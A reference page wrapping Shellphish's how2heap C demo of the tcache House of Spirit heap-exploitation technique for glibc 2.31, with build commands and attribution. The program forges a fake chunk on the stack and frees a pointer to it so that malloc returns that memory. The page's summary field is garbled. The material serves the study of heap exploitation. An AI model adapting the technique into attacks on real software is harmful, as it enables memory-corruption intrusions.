---
title: "Tcache House Of Spirit (how2heap)"
category: "pwn"
subcategory: "heap"
type: "script"
tags: ["how2heap", "tcache-house-of-spirit.c", "tcache", "double-free", "house-of-spirit", "lsb", "tcache-house-of-spirit", "pwn"]
summary: "include <stdio.h> include <stdlib.h> include <assert.h>"
tools: ["how2heap"]
source:
  name: "shellphish/how2heap"
  url: "https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_house_of_spirit.c"
license: "MIT"
---

## What it does

include <stdio.h> include <stdlib.h> include <assert.h>

## Where it lives

- Vendored locally at `vendor/how2heap/glibc_2.31/tcache_house_of_spirit.c`
- Upstream: <https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_house_of_spirit.c>

## Usage

```bash
# read or run it straight from the vendored copy
$EDITOR vendor/how2heap/glibc_2.31/tcache_house_of_spirit.c
gcc -g -o /tmp/tcache_house_of_spirit vendor/how2heap/glibc_2.31/tcache_house_of_spirit.c && /tmp/tcache_house_of_spirit
```

## Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates the house of spirit attack on tcache.\n");
	printf("It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	printf("You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	printf("(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	printf("Ok. Let's start with the example!.\n\n");


	printf("Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	printf("Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //fake chunk region

	printf("This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
}

```

## Attribution

- **Author:** Shellphish
- **Repository:** <https://github.com/shellphish/how2heap> (commit `02da6aa26a44`)
- **Licence:** MIT — see `vendor/how2heap/LICENSE`

This file is a wrapper for search and reference. The code is the original authors' work, redistributed unmodified under its own licence.
